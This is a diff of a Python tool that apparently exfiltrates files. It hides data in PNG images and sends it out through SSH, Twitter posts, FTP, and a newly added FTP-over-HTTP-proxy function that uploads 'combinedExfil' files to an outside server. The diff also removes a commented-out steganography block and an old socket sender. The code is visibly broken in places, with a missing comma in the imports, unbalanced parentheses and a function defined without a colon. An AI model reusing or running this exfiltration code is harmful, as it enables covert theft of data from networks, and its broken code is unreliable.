@@ -1,5 +1,5 @@
 from __future__ import print_function
-import os,re,tweepy,PyPDF2, sys,glob,webbrowser,smtplib,dropbox,ftplib,xlrd, socks, zlib, shutil,win32com.client as win32,socket,threading
+import os,re,tweepy,PyPDF2, chilkat sys,glob,webbrowser,smtplib,dropbox,ftplib,xlrd, socks, zlib, shutil,win32com.client as win32,socket,threading
 from win32 import win32api
 from send2trash import send2trash
 from os.path import join, dirname, abspath
@@ -328,70 +328,6 @@ def stego():
                     secret = lsb.hide(gpath+"\\diamond_PNG6695.png", textAdd)
                     secret.save(gpath+"\\X"+str(numExfilFiles)+"combinedExfil.png")
         numF+=1
-
-'''
-# -*- utf-8 -*-
-testing purposes, this code isn't needed or part of this
-
-def encryptStego():
-    with open(gpath+"\\imager.png", 'rb') as imagefile:
-        bmp = imagefile.read()
-    with open(gpath+"\\fakesecretfile.txt", 'rb') as textInfo:
-        data = textInfo.read()
-    PointofSteroids = bmp[10]  # The byte at position 10 tells us where the color data starts
-    bmpa = bytearray(bmp)
-    bits = []
-    for i in range(len(data)):
-        for k in range(7, -1, -1):
-            bits.append(data[i] & 1 << k != 0)
-    BitArray=bits
-    # We need to make sure there is enough space to hide our data
-    for i in range(len(BitArray)):
-        bmpa[i + PointofSteroids] = concludingBit(bmpa[i + PointofSteroids],BitArray[i])
-    goingaway=open("FreeVector-Colorful-Shapes-Background.bmp".replace('.bmp', '_hidden.bmp'), 'wb')
-    goingaway.write(bmpa)
-
-def concludingBit(OriginalByte, FinalByte):
-    new_byte = 0
-    OB=OriginalByte
-    FB=FinalByte
-    if FinalByte:
-        if ((OB & (1 << 0)) != 0):
-            new_byte = OB
-        else:
-            new_byte = OB
-            + 1
-    else:
-        if ((OB & (1 << 0)) != 0):
-            new_byte = OB - 1
-        else:
-            new_byte = OB 
-    return new_byte
-def main():
-    #f = open('carson-2016.jpg', 'wb')
-    #f.write(request.urlopen("").read())
-    #f.close()
-    encrypt()
-#-----------------------------------------------------------------
-def stegUndo
-    with open(gpath+"\\FreeVector-Colorful-Shapes-Background_hidden",'rb') as bmp_file:
-        bmp = bmp_file.read()
-        #The byte at position 10 tells us where the color data starts
-    start_offset = bmp[10] 
-
-    #Deconstruct each byte and get its final bit
-    bits = []
-    for i in range(start_offset,len(bmp)):
-        bits.append(nth_bit_present(bmp[i],0))
-    #assert len(bits) == 8
-    new_byte = 0
-    for i in range(8):
-        if bits[i]==True:
-          new_byte |= 1 << 7 - i
-        else:
-          new_byte |= 0 << 7 - i
-    print(new_byte)
-'''
 def SSHTunnel():
     global numBytes, numExfilFiles, numFiles, dT, eD, flg,gpath
     client = paramiko.SSHClient()
@@ -480,17 +416,39 @@ def TwitterExfil():
             filename=gpath+"\\X"+str(fnum)+"combinedExfil.png"
             api.update_with_media(filename, status=fnum)
             fnum+=1
-def httpTransfer(): #Really Old-Needs replacing
-    file = open("fakesecretfile.txt", "rb")
-    pcs = os.path.getsize("fakesecretfile.txt")
-    sock = socket.socket()
-    ofs=0
-    sock.connect((ip, 4532))
-    while True:
-        chunk = file.read(8)
-        if not chunk:
-            break  # EOF
-        sock.sendall(filepart)
+def HttpTunnel(): 
+    #FTP through HTTP proxy tunneling
+    ftp = chilkat.CkFtp2()
+    ftp.UnlockComponent("Any String Works")
+    ftp.put_Hostname("demo.wftpserver.com")
+    ftp.put_Username("demo-user")
+    ftp.put_Password("demo-user")
+    ftp.put_HttpProxyHostname("192.168.1.127") #Users input will need to be added
+    ftp.put_HttpProxyPort(19893) #Or enter your own
+    ftp.put_HttpProxyUsername("myProxyUsername")
+    ftp.put_HttpProxyPassword("myProxyPassword")
+
+    ftp.put_Passive(True)
+    ftp.Connect()
+    ftp.ChangeRemoteDir("upload")
+    localFilename = (gpath+"\\X"+str(fnum)+"combinedExfil.txt")
+    remoteFilename = "X"+str(fnum)+"combinedExfil.txt")
+    fnum=1
+    if flg!=1:
+        while fnum<numExfilFiles:
+            localFilename = (gpath+"\\X"+str(fnum)+"combinedExfil.txt")
+            remoteFilename = "X"+str(fnum)+"combinedExfil.txt")
+            ftp.PutFile(localFilename,remoteFilename)
+            fnum+=1
+    if flg==1:
+        while fnum<numExfilFiles:
+            localFilename = (gpath+"\\X"+str(fnum)+"combinedExfil.png")
+            remoteFilename = "X"+str(fnum)+"combinedExfil.png")
+            ftp.PutFile(localFilename,remoteFilename)
+            fnum+=1
+    ftp.PutFile(localFilename,remoteFilename)
+    ftp.Disconnect()
+    print("Files(s) Uploaded!")
 def FTPTransfer():
     #This also assumes it will go out in txt file format, will be changed in the future
     global numBytes, numExfilFiles, numFiles, dT, eD,gpath
@@ -572,7 +530,8 @@ def exfiltrationMethod(s,fname,spaces):
         dataTransformationMethod(path,s,fname,spaces)
         SSHTunnel()
     if eD==10:
-        ed=10
+        dataTransformationMethod(path,s,fname,spaces)
+        HttpTunnel()
 def putTogether(s, numFilesC, pathOr):
     counterFile=0
     global numBytes, numExfilFiles, numFiles, dT, eD, gpath
